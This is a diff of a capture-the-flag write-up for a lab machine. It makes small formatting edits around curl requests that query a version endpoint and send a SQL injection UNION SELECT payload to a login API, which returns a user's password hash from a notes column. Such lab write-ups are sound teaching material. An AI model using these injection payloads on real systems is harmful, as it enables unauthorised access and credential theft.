@@ -29,7 +29,7 @@ To get the build version we send a request to /info
 curl -i -s http://10.10.196.16/info
 
 ```
-However it returned 1.3.6-final (which did not turn out to be the correct answer),so I thought it is some machine error and so I sent the request again and (much to my bewilderment).got a different build version.
+However it returned 1.3.6-final (which did not turn out to be the correct answer),so I thought it is some machine error and so I sent the request again and (much to my bewilderment) got a different build version.
 
 ```
 1.3.4-dev
@@ -48,8 +48,8 @@ The sqlite_master contains the following columns:
 The sqlite_master table contains the following columns:
 
 Column Name	Description
-type	    The type of database object such as table, index, trigger or view.
-name	    The name of the database object.
+type	        The type of database object such as table, index, trigger or view.
+name	        The name of the database object.
 tbl_name	The table name that the database object is associated with.
 rootpage	Root page.
 sql	        SQL used to create the database object.
@@ -117,7 +117,8 @@ curl -XPOST 'http://10.10.196.16/api/login' -d "username=1'UNION SELECT 1,notes 
   ], 
   [
     1, 
-    "My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n"
+    "My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422
+    cf984324f645b84427343f4\n"
   ]
 ]
 
